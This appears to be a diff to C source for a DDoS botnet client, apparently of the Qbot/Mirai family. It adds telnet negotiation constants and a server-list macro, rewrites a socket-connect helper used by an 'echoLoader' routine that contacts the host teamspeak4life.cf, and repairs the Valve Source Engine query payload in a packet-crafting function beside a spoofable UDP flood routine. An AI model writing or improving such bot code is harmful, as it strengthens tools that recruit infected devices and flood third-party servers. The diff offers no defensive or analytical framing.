@@ -1,3 +1,15 @@
+#define PR_SET_NAME 15
+#define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))
+#define PAD_RIGHT 1
+#define PAD_ZERO 2
+#define PRINT_BUF_LEN 12
+#define CMD_IAC   255
+#define CMD_WILL  251
+#define CMD_WONT  252
+#define CMD_DO    253
+#define CMD_DONT  254
+#define OPT_SGA   3
+#define BUFFER_SIZE 4096
 #include <arpa/inet.h>
 #include <errno.h>
 #include <fcntl.h>
@@ -193,45 +205,37 @@ char *makestring() {
     }
     return tmp;
 }
- #include <stdio.h>
-#include <string.h>
-#include <unistd.h>
-#include <sys/socket.h>
-#include <netdb.h>
-#include <stdlib.h>
 
-#define BUFFER_SIZE 4096
 
-int socket_connect(const char *hostname, int port) {
-    struct hostent *host;
+
+
+int s_connect(char *host, in_port_t port)
+{
+    struct hostent *hp;
     struct sockaddr_in addr;
-    int sockfd;
+    int on = 1, sock;
 
-    if ((host = gethostbyname(hostname)) == NULL) {
-        perror("gethostbyname");
-        return -1;
-    }
+    if ((hp = gethostbyname(host)) == NULL)
+        return 0;
 
-    sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    if (sockfd < 0) {
-        perror("socket");
-        return -1;
-    }
+    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sock == -1)
+        return 0;
 
+    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
+
+    memset(&addr, 0, sizeof(addr));
     addr.sin_family = AF_INET;
     addr.sin_port = htons(port);
-    addr.sin_addr = *((struct in_addr *)host->h_addr);
-    memset(&(addr.sin_zero), 0, 8);
+    memcpy(&addr.sin_addr, hp->h_addr, hp->h_length);
 
-    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(struct sockaddr)) < 0) {
-        perror("connect");
-        close(sockfd);
-        return -1;
+    if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) {
+        close(sock);
+        return 0;
     }
 
-    return sockfd;
+    return sock;
 }
-
 void echoLoader() {
     char buffer[BUFFER_SIZE];
     int fd;
@@ -239,7 +243,7 @@ void echoLoader() {
     FILE *f;
 
     // Connect to server
-    fd = socket_connect("teamspeak4life.cf", 80);
+    fd = s_connect("teamspeak4life.cf", 80);
     if (fd < 0) {
         printf("Connection failed\n");
         return;
@@ -907,7 +911,8 @@ int socket_connect(char *host, in_port_t port)
     if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
     return sock;
 }
- 
+
+
  int randnum(int min_num, int max_num)
 {
     int result = 0, low_num = 0, hi_num = 0;
@@ -1151,9 +1156,8 @@ void sendUDP(unsigned char *target, int port, int timeEnd, int spoofit, int pack
 
  void makevsepacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
 {
-    char *vse_payload;
-    int vse_payload_len;
-    vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79 + /x54/x53/x6f/x75/x72/x63/x65/x20/x45/x6e/x67/x69/x6e/x65/x20/x51/x75/x65/x72/x79 rfdknjms", &vse_payload_len;
+        char vse_payload[] = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79";
+        int vse_payload_len = sizeof(vse_payload) - 1;  // excludes null terminator
         iph->ihl = 5;
         iph->version = 4;
         iph->tos = 0;
